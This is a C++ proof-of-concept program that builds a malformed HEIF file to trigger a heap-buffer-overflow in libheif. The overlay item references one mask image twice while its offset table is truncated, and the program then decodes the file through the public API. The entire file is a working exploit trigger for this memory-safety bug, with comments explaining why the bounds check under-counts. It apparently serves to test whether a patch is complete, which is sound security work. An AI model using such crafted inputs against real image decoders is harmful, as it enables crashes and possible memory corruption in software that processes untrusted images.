// Residual-defect PoC for the "allow repeated 'iref' references" change.
//
// Builds a minimal, self-contained HEIF file whose primary item is an 'iovl'
// overlay that references a single 'mski' base image twice (one placement per
// reference -- exactly the double-reference pattern the patch enables). The
// overlay payload is truncated so that it carries room for only one (x,y)
// offset pair, while the overlay lists two placements.
//
// On the fixed (golden) tree, ImageOverlay::parse validates that the payload
// holds two full offset pairs and rejects the truncated spec cleanly.
// On the shipped tree, the bounds check under-counts the offset table, so the
// offset read runs past the end of the item-data buffer -> heap-buffer-overflow.
//
// Entry point: heif_context_read_from_file + heif_decode_image (public API).

#include <cstdint>
#include <cstdio>
#include <string>
#include <vector>

#include "libheif/heif.h"

static void put_u32_be(std::vector<uint8_t>& o, uint32_t v) {
  o.push_back((v >> 24) & 0xFF); o.push_back((v >> 16) & 0xFF);
  o.push_back((v >> 8) & 0xFF);  o.push_back(v & 0xFF);
}
static void put_u16_be(std::vector<uint8_t>& o, uint16_t v) {
  o.push_back((v >> 8) & 0xFF); o.push_back(v & 0xFF);
}
static void append_fourcc(std::vector<uint8_t>& o, const char* f) {
  o.insert(o.end(), f, f + 4);
}
static void append(std::vector<uint8_t>& o, const std::vector<uint8_t>& v) {
  o.insert(o.end(), v.begin(), v.end());
}
static std::vector<uint8_t> make_box(const char* type, const std::vector<uint8_t>& payload,
                                     bool full = false, uint8_t version = 0, uint32_t flags = 0) {
  std::vector<uint8_t> body;
  if (full) {
    body.push_back(version);
    body.push_back((flags >> 16) & 0xFF);
    body.push_back((flags >> 8) & 0xFF);
    body.push_back(flags & 0xFF);
  }
  append(body, payload);
  std::vector<uint8_t> box;
  put_u32_be(box, static_cast<uint32_t>(8 + body.size()));
  append_fourcc(box, type);
  append(box, body);
  return box;
}

struct Item {
  uint16_t id;
  std::string type;
  std::vector<uint16_t> dimg;
  std::vector<uint8_t> data;
};

// A deliberately short 'iovl' spec: header is complete, but only one (x,y)
// offset pair is present even though num_images == 2.
static std::vector<uint8_t> truncated_overlay_spec() {
  std::vector<uint8_t> s;
  s.push_back(0);                       // version
  s.push_back(0);                       // flags -> 16-bit fields
  for (int i = 0; i < 4; i++) put_u16_be(s, 0);  // background RGBA
  put_u16_be(s, 8);                     // canvas width
  put_u16_be(s, 8);                     // canvas height
  put_u16_be(s, 0);                     // offset[0].x
  put_u16_be(s, 0);                     // offset[0].y
  // offset[1] intentionally omitted.
  return s;                             // 18 bytes
}

static std::vector<uint8_t> build_file(const std::vector<Item>& items, uint16_t primary_id) {
  const uint32_t W = 8, H = 8;

  std::vector<uint8_t> ftyp_payload;
  append_fourcc(ftyp_payload, "heic");
  put_u32_be(ftyp_payload, 0);
  append_fourcc(ftyp_payload, "mif1");
  append_fourcc(ftyp_payload, "heic");
  auto ftyp = make_box("ftyp", ftyp_payload);

  std::vector<uint8_t> hdlr_payload;
  put_u32_be(hdlr_payload, 0);
  append_fourcc(hdlr_payload, "pict");
  put_u32_be(hdlr_payload, 0); put_u32_be(hdlr_payload, 0); put_u32_be(hdlr_payload, 0);
  hdlr_payload.push_back(0);
  auto hdlr = make_box("hdlr", hdlr_payload, true);

  std::vector<uint8_t> pitm_payload;
  put_u16_be(pitm_payload, primary_id);
  auto pitm = make_box("pitm", pitm_payload, true);

  std::vector<uint8_t> iinf_payload;
  put_u16_be(iinf_payload, static_cast<uint16_t>(items.size()));
  for (const auto& it : items) {
    std::vector<uint8_t> infe_payload;
    put_u16_be(infe_payload, it.id);
    put_u16_be(infe_payload, 0);
    append_fourcc(infe_payload, it.type.c_str());
    infe_payload.push_back(0);
    append(iinf_payload, make_box("infe", infe_payload, true, 2));
  }
  auto iinf = make_box("iinf", iinf_payload, true);

  std::vector<uint8_t> ispe_payload;
  put_u32_be(ispe_payload, W); put_u32_be(ispe_payload, H);
  auto ispe = make_box("ispe", ispe_payload, true);

  std::vector<uint8_t> mskC_payload;
  mskC_payload.push_back(8);
  auto mskC = make_box("mskC", mskC_payload, true);

  std::vector<uint8_t> ipco_payload;
  append(ipco_payload, ispe);   // property 1
  append(ipco_payload, mskC);   // property 2
  auto ipco = make_box("ipco", ipco_payload);

  std::vector<uint8_t> ipma_payload;
  put_u32_be(ipma_payload, static_cast<uint32_t>(items.size()));
  for (const auto& it : items) {
    put_u16_be(ipma_payload, it.id);
    if (it.type == "mski") {
      ipma_payload.push_back(2);
      ipma_payload.push_back(0x80 | 1);
      ipma_payload.push_back(0x80 | 2);
    } else {
      ipma_payload.push_back(1);
      ipma_payload.push_back(0x80 | 1);
    }
  }
  auto ipma = make_box("ipma", ipma_payload, true);

  std::vector<uint8_t> iprp_payload;
  append(iprp_payload, ipco);
  append(iprp_payload, ipma);
  auto iprp = make_box("iprp", iprp_payload);

  std::vector<uint8_t> idat_payload;
  struct Extent { uint16_t id; uint32_t off; uint32_t len; };
  std::vector<Extent> extents;
  for (const auto& it : items) {
    if (!it.data.empty()) {
      extents.push_back({it.id, static_cast<uint32_t>(idat_payload.size()),
                         static_cast<uint32_t>(it.data.size())});
      append(idat_payload, it.data);
    }
  }
  auto idat = make_box("idat", idat_payload);

  std::vector<uint8_t> iloc_payload;
  iloc_payload.push_back((4 << 4) | 4);
  iloc_payload.push_back((0 << 4) | 0);
  put_u16_be(iloc_payload, static_cast<uint16_t>(extents.size()));
  for (const auto& e : extents) {
    put_u16_be(iloc_payload, e.id);
    put_u16_be(iloc_payload, 0x0001);     // construction_method = idat
    put_u16_be(iloc_payload, 0);
    put_u16_be(iloc_payload, 1);
    put_u32_be(iloc_payload, e.off);
    put_u32_be(iloc_payload, e.len);
  }
  auto iloc = make_box("iloc", iloc_payload, true, 1);

  std::vector<uint8_t> iref_children;
  for (const auto& it : items) {
    if (!it.dimg.empty()) {
      std::vector<uint8_t> dimg_payload;
      put_u16_be(dimg_payload, it.id);
      put_u16_be(dimg_payload, static_cast<uint16_t>(it.dimg.size()));
      for (uint16_t to : it.dimg) put_u16_be(dimg_payload, to);
      append(iref_children, make_box("dimg", dimg_payload));
    }
  }
  auto iref = make_box("iref", iref_children, true);

  std::vector<uint8_t> meta_payload;
  append(meta_payload, hdlr);
  append(meta_payload, pitm);
  append(meta_payload, iinf);
  append(meta_payload, iprp);
  append(meta_payload, iloc);
  append(meta_payload, iref);
  append(meta_payload, idat);
  auto meta = make_box("meta", meta_payload, true);

  std::vector<uint8_t> file;
  append(file, ftyp);
  append(file, meta);
  return file;
}

int main(int argc, char** argv) {
  const char* path = (argc > 1) ? argv[1] : "/tmp/residual_poc.heic";

  std::vector<Item> items;
  items.push_back({1, "mski", {}, std::vector<uint8_t>(64, 0x7F)});
  // Primary overlay references the base twice (one placement per reference).
  items.push_back({2, "iovl", {1, 1}, truncated_overlay_spec()});

  auto data = build_file(items, /*primary=*/2);

  FILE* f = fopen(path, "wb");
  if (!f) { perror("fopen"); return 2; }
  fwrite(data.data(), 1, data.size(), f);
  fclose(f);

  heif_context* ctx = heif_context_alloc();
  heif_error err = heif_context_read_from_file(ctx, path, nullptr);
  if (err.code != heif_error_Ok) {
    printf("read_from_file failed: %s\n", err.message);
    heif_context_free(ctx);
    return 1;
  }

  heif_image_handle* handle = nullptr;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    printf("get_primary_image_handle failed: %s\n", err.message);
    heif_context_free(ctx);
    return 1;
  }

  heif_image* img = nullptr;
  err = heif_decode_image(handle, &img, heif_colorspace_undefined, heif_chroma_undefined, nullptr);
  printf("decode returned: code=%d sub=%d msg=%s\n", err.code, err.subcode,
         err.message ? err.message : "(none)");

  if (img) heif_image_release(img);
  heif_image_handle_release(handle);
  heif_context_free(ctx);
  return 0;
}
